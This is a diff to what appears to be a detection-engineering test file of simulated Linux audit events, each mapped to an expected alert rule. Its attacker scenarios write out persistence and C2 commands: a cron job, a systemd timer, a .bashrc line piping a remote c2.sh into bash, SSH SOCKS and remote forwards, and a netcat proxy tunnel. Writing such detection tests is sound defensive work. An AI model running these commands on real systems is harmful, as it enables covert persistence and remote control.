@@ -18,7 +18,9 @@ scenarios:
     command_line: >-
       bash -c 'echo "*/5 * * * * root /tmp/update.sh"
       > /etc/cron.d/system-update'
-
+    expect:
+      rules: [linux_cron_persistence_interactive_shell]
+      min_alerts: 1
 
   - id: benign_crontab_listing
     name: Benign Cron listing from an interactive shell
@@ -32,10 +34,16 @@ scenarios:
     user_id: 1000
     audit_user_id: 1000
     terminal: pts0
-    exe: /usr/bin/bash
+    exe: /usr/bin/crontab
     parent_comm: bash
     command_line: crontab -l
-  
+    expect:
+      id: benign_linux_cron_listing
+      rules: []
+      min_alerts: 0
+      max_alerts: 0
+      must_not_match: [linux_cron_persistence_interactive_shell]
+
   - id: ssh_remote_tunneling
     name: Tunneling via SSH remote forward
     description: >
@@ -53,6 +61,9 @@ scenarios:
     exe: /usr/bin/ssh
     parent_comm: bash
     command_line: ssh -R 4444:203.0.113.99:2222 user@example.com
+    expect:
+      rules: [linux_audit_ssh_remote_forward]
+      min_alerts: 1
 
   - id: ssh_remote_forward
     name: SSH remote port forwarding
@@ -73,4 +84,122 @@ scenarios:
     command_line: >-
       ssh -N -f -R 8443:127.0.0.1:443 user@203.0.113.200
       -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null
+    expect:
+      rules: [linux_audit_ssh_remote_forward]
+      min_alerts: 1
 
+  - id: ssh_proxyjump_tunnel
+    name: SSH ProxyJump through bastion
+    description: >
+      From an interactive shell, an operator reaches an internal host by
+      jumping through a bastion (ProxyJump), tunneling traffic via an SSH proxy.
+    technique_id: T1090
+    platform: linux
+    log_source: linux_audit
+    count: 1
+    host: web-prod-02
+    user: deploy
+    user_id: 1001
+    audit_user_id: 1001
+    terminal: pts0
+    exe: /usr/bin/ssh
+    parent_comm: bash
+    command_line: >-
+      ssh -J deploy@bastion.example.com
+      -o StrictHostKeyChecking=no user@10.0.0.25
+    expect:
+      rules: [linux_audit_ssh_proxy_tunnel]
+      min_alerts: 1
+
+  # --- 5 additional Persistence / C2 cases ---
+
+  - id: systemd_timer_persistence
+    name: Systemd user timer persistence
+    description: >
+      Attacker drops a systemd user timer for recurring execution after gaining
+      an interactive shell (Scheduled Task/Job - Systemd Timers).
+    technique_id: T1053.006
+    platform: linux
+    log_source: linux_audit
+    count: 1
+    host: linux-workstation-01
+    user: attacker
+    user_id: 1000
+    audit_user_id: 1000
+    terminal: pts0
+    exe: /usr/bin/bash
+    parent_comm: bash
+    command_line: >-
+      bash -c 'echo -e "[Timer]\nOnCalendar=*:0/5\n[Install]\nWantedBy=timers.target"
+      > ~/.config/systemd/user/update.timer'
+    expect:
+      rules: [linux_audit_systemd_timer_persistence]
+      min_alerts: 1
+
+  - id: bashrc_persistence
+    name: Bashrc persistence hook
+    description: >
+      Attacker appends a remote payload launcher to ~/.bashrc so future logins
+      re-establish control (Event Triggered Execution - Unix Shell Configuration).
+    technique_id: T1546.004
+    platform: linux
+    log_source: linux_audit
+    count: 1
+    host: linux-workstation-01
+    user: attacker
+    user_id: 1000
+    audit_user_id: 1000
+    terminal: pts0
+    exe: /usr/bin/bash
+    parent_comm: bash
+    command_line: >-
+      bash -c 'echo "curl -fsSL http://185.220.101.42/c2.sh | bash" >> ~/.bashrc'
+    expect:
+      rules: [linux_audit_bashrc_persistence]
+      min_alerts: 1
+
+  - id: ssh_dynamic_socks_forward
+    name: SSH dynamic SOCKS forward
+    description: >
+      Attacker opens an SSH dynamic port forward (-D) to proxy C2 or browse
+      through the compromised host (Protocol Tunneling).
+    technique_id: T1572
+    platform: linux
+    log_source: linux_audit
+    count: 1
+    host: web-prod-01
+    user: deploy
+    user_id: 1001
+    audit_user_id: 1001
+    terminal: pts0
+    exe: /usr/bin/ssh
+    parent_comm: bash
+    command_line: ssh -N -f -D 9050 user@203.0.113.200
+    expect:
+      rules: [linux_audit_ssh_remote_forward]
+      min_alerts: 1
+
+  - id: ssh_proxycommand_tunnel
+    name: SSH ProxyCommand tunnel
+    description: >
+      Attacker forces SSH through an HTTP CONNECT proxy using ProxyCommand to
+      hide C2 traffic (Proxy).
+    technique_id: T1090
+    platform: linux
+    log_source: linux_audit
+    count: 1
+    host: web-prod-02
+    user: deploy
+    user_id: 1001
+    audit_user_id: 1001
+    terminal: pts0
+    exe: /usr/bin/ssh
+    parent_comm: bash
+    command_line: >-
+      ssh -o ProxyCommand="nc -X connect -x 203.0.113.50:8080 %h %p"
+      user@10.0.0.25
+    expect:
+      rules: [linux_audit_ssh_proxy_tunnel]
+      min_alerts: 1
+
+ 
